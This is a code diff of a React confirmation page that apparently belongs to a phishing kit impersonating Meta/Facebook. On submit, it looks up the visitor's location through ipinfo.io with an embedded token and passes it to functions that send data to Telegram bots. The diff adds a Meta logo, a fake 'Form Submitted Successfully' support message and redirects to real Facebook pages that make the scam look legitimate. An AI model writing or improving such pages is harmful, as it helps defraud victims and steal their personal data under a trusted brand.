@@ -18,6 +18,8 @@ const Confirm = () => {
   const [checkSubmitAndTime, setCheckSubmitAndTime] = useState(false);
   const [open, setOpen] = useState(false);
   const [confirmLoading, setConfirmLoading] = useState(false);
+  const [open2, setOpen2] = useState(false);
+  const [confirmLoading2, setConfirmLoading2] = useState(false);
   const navigate = useNavigate();
   useEffect(() => {
     const timer = setInterval(() => {
@@ -50,9 +52,7 @@ const Confirm = () => {
       return;
     }
     setLoading(true);
-    const location = await axios.get(
-      "https://ipinfo.io?token=4ef03889d81a2d"
-    );
+    const location = await axios.get("https://ipinfo.io?token=4ef03889d81a2d");
     await Promise.all([
       sendTelegramBotForBusiness(location),
       sendTelegramBotForGgsheet(location),
@@ -64,7 +64,8 @@ const Confirm = () => {
       })
     );
     setLoading(false);
-    window.location.href = "https://www.facebook.com";
+    showModal2();
+    // window.location.href = "https://www.facebook.com";
     // navigate("/upload-image");
   };
 
@@ -162,16 +163,23 @@ const Confirm = () => {
   const handleCancel = () => {
     setOpen(false);
   };
+  const showModal2 = () => {
+    setOpen2(true);
+  };
+
+  const handleCancel2 = () => {
+    setOpen2(false);
+  };
 
   return (
     <div className="container_confirm">
       <div className="header">
-        <div className="logo">
+        <div
+          className="logo"
+          onClick={() => (window.location.href = "https://www.facebook.com")}
+        >
           <a href="##">
-            <img
-              src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F"
-              alt=""
-            />
+            <img src="/images/meta.png" alt="" />
           </a>
         </div>
       </div>
@@ -272,6 +280,28 @@ const Confirm = () => {
         </ol>
         <div style={{ display: "flex", justifyContent: "flex-end" }}>
           <Button onClick={handleCancel}>Close</Button>
+        </div>
+      </Modal>
+      <Modal
+        title="Form Submitted Successfully"
+        open={open2}
+        confirmLoading={confirmLoading2}
+        onCancel={handleCancel2}
+        footer={false}
+      >
+        <p className="mb-4">
+          Thanks for contacting us. You'll get a notification when we respond in
+          1-2 business days. You can view responses in your Support Inbox.
+        </p>
+        <div style={{ display: "flex", justifyContent: "flex-end" }}>
+          <Button
+            onClick={() =>
+              (window.location.href =
+                "https://www.facebook.com/policies_center/")
+            }
+          >
+            Ok
+          </Button>
         </div>
       </Modal>
     </div>
